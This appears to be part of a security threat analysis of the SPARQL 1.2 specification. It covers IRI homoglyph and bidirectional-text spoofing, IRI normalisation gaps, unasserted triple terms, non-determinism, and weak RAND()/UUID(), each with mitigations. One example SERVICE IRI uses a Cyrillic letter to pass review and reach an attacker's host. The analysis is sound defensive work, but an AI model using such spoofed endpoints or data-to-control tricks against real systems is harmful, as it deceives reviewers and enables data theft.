IRI spoofing via confusables and bidirectional text

Risk
Medium
Where
High at P5
Impact
Medium
Ease
Medium
Mechanism

Already in security, which covers Cyrillic "о" versus Latin "o", combining sequences, and cites UTR36 and RFC 3987 §8. Its framing, though, is about authors matching data: "Users of SPARQL must take care to construct queries with IRIs that match the IRIs in the data."

The security framing is different and worth adding

In a query language the risk is that a human reviewer or an automated allowlist is deceived. SERVICE <https://trusted.exаmple/> with a Cyrillic а passes visual review and reaches the attacker's host; a FROM allowlist checked by eye fails the same way. Additionally, bidirectional text — and now RDF 1.2 base direction, with LANGDIR and STRLANGDIR newly in this document — can make displayed query text differ in order from its logical content, a real hazard wherever queries are shown in a UI for approval.

Mitigations

Compare allowlists on a normalized or Punycode form, never on display form. Apply confusable detection and script restriction in any tool that displays queries for review. Render IRIs so bidi reordering cannot mislead. Where a query is approved by a human, show the resolved and normalized targets separately from the source text.

SQ-ID-02

No normalization: strict term identity, loose policy identity

Risk
Medium
Where
all profiles
Impact
Medium
Ease
Medium
Mechanism

relIRIs: "Neither Syntax-Based Normalization nor Scheme-Based Normalization ... are performed." sec-escapes adds that %-sequences "are not decoded during processing", with the worked example that <http://a.example/%66oo-bar> designates http://a.example/%66oo-bar and "not IRI http://a.example/foo-bar". func-iri says only that an implementation "MAY normalize the IRI."

This is correct for RDF semantics — term identity must be strict. The security consequence is the gap it opens between term identity and network identity: <http://ex/a>, <http://EX/a>, <http://ex:80/a> and <http://ex/%61> are four distinct RDF terms and one network target.

Impact

Failures in both directions. A security control keyed on one spelling fails open against another. A data query using one spelling fails closed against data written with another — which is how an incomplete result gets mistaken for an authoritative "no".

Mitigations

Never use IRI string equality for an authorization decision; decide on the resolved network target, re-checked after redirects. Canonicalize at ingest so data has one spelling. Keep policy normalization strictly separate from term identity — normalizing terms would break RDF semantics.

SQ-ID-03

Triple terms mention, they do not assert new in 1.2

Risk
Medium
Where
all profiles
Impact
Medium
Ease
Medium
Mechanism

A triple term is a term, not an assertion. <<( :a :b :c )>> occurring in data does not mean :a :b :c holds. The expansions in syntaxReifyingTriples and syntaxAnnotation differ on exactly this point: the annotation form expands to the asserted triple plus the reifying triple, whereas the bare nested pattern asserts nothing. And the reifier is attacker-suppliable — << ?s ?p ?o ~ ?id >> matches any reifier, and in data an attacker who can write may choose the reifier IRI.

Impact

An application that treats a matched triple term as a fact — or a UI that renders one as a statement — can be fed unasserted or adversarial content. This matters most in exactly the applications reification exists for: provenance, attribution, trust and audit. Treating the existence of a reifier as evidence of a claim's truth is the specific error, and the reifier's identity is not itself trustworthy evidence of origin.

Mitigations

Be explicit in application code and UI about mention versus assertion. Never treat a reifier's existence as evidence of truth, or its IRI as provenance, without an independent trust path — signature, trusted graph, verified source. Worth a note in security given that this is new surface in 1.2 and that provenance is its primary use case.

3.GIntegrity and non-determinism

Mostly correctness traps that become security problems in specific designs — signing, caching, audit replay — plus one straightforwardly actionable finding about randomness.

SQ-INT-01

Non-determinism breaks signing, caching and audit replay

Risk
Medium
Where
all profiles
Impact
Medium
Ease
Low
Mechanism

The specification leaves a long list of things unspecified or implementation-dependent, each deliberately.

ConstructSpec text
func-rand"pseudo-random"; numbers "should be produced with approximately equal probability" — no unpredictability requirement
func-nowsame value throughout one execution, but "The exact moment returned is not specified"
func-uuid"The variant and version of the UUID is implementation dependent"
aggSample"returns an arbitrary value from the sequence"
aggGroupConcat"The order of the strings is not specified"
modReducedduplicate elimination is permitted, not required

Impact on A8

Any control that signs, hashes, caches, replays or diffs results is unsound without care: identical queries legitimately yield different bytes, so signature verification and cross-engine comparison produce false mismatches, and audit replay cannot reproduce a recorded result. The sharpest instance is a cache keyed on query text: a query containing NOW() or RAND() has a correct result that changes between executions, so a cache that ignores this serves a stale result — and in a multi-tenant deployment, a cache key that omits the requester's identity and the effective dataset serves another tenant's result.

Mitigations

Do not sign or cache results of queries containing non-deterministic functions; detect them at parse time and mark the query uncacheable. Include requester identity and effective dataset in every cache key. Canonicalize — including blank node labels and ordering — before hashing. If a specific ordering matters, specify it fully in the query rather than relying on the partial order.

SQ-INT-02

RAND() and UUID() are not security primitives, and data must not become control

Risk
Medium–High
Where
P2 P3 P4 P5
Impact
High
Ease
Medium
(a) Unsuitable randomness

func-rand requires only approximately uniform pseudo-randomness, with no unpredictability requirement — so RAND() must never seed a token, nonce or secret. func-uuid leaves "the variant and version ... implementation dependent", so a conforming UUID() may be version 1 — which embeds a MAC address and a timestamp, and is therefore both predictable and host-identifying.

This matters because applications genuinely do use UUID() to mint identifiers in CONSTRUCT and INSERT, and if those identifiers are then treated as unguessable — capability URLs, share links, reset tokens — the result is a real vulnerability; and STRUUID() may additionally leak host and time information into published data.

Mitigation. State plainly that RAND(), UUID() and STRUUID() are not cryptographic primitives and must not generate secrets, tokens or capability identifiers. Generate those outside the query with a CSPRNG and pass them in. Implementations should prefer UUIDv4 from a CSPRNG so that the common misuse fails safe.

(b) Data must not become control

If an attacker can write triples — via a separate ingest path, an update endpoint, or FROM dereference of an untrusted source (SQ-NET-05) — they influence more than results. Because the language permits variables in these positions, a value from the data can become:

  • a SERVICE endpoint (VarOrIri — SQ-NET-03),
  • a GRAPH target (queryDataset),
  • a REGEX pattern (SQ-DOS-05),
  • an argument to IRI() and so a constructed dereference target.

This is the SPARQL analogue of stored-injection escalation: write access to data becomes partial control over query behaviour.

Mitigation. A value drawn from the dataset must never be used as an endpoint, a pattern or a function name without validation against a static allowlist. In hardened profiles, reject variable SERVICE endpoints outright. Keep ingest provenance so data-sourced values can be identified as such.

The short version

For a public endpoint (P1), availability is the entire threat model. For a multi-tenant service (P2), the chain SQ-CONF-01 → SQ-CONF-03 → SQ-NET-03 is the one that matters: no language-level access control, result-filtering that leaks, and an exfiltration channel that does not need the results at all. For an internal endpoint (P4), the service's network position (A4) is the asset the owner is least likely to have inventoried.
